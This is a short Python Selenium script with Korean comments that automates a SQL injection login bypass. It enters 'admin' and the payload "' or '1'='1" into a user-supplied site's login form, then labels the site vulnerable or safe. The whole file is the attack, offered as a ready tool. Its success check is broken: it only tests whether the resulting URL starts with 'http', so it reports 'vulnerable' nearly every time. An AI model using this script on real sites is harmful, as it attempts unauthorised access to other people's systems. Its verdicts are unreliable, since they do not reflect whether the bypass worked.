from selenium import webdriver #크롤링을 위한 모듈

text = input('로그인 주소를 입력하세요(www.test.com) : ')
url = 'http://'+text

#xpath 모음
xpath_id = '//*[@id="uid"]'
xpath_pw = '//*[@id="passw"]'
xpath_button = '//*[@id="login"]/table/tbody/tr[3]/td[2]/input'

id = "admin" #id 값은 admin으로 알고 있다고 가정
pw = "' or '1'='1"

#크롬 브라우저 실행 -> url 열기
driver = webdriver.Chrome("C:/chromedriver.exe")
driver.get(url)

#지정한 xpath에 값 넣고 실행하기
driver.find_element("xpath", xpath_id).send_keys(id)
driver.find_element("xpath", xpath_pw).send_keys(pw)
driver.find_element("xpath", xpath_button).click()

variable = driver.current_url #현재 페이지 출력 (로그인 성공 여부 확인 가능)

if variable.lower().startswith('http'):
    print('sql_injection : 취약')
else :
    print('sql_injection : 양호')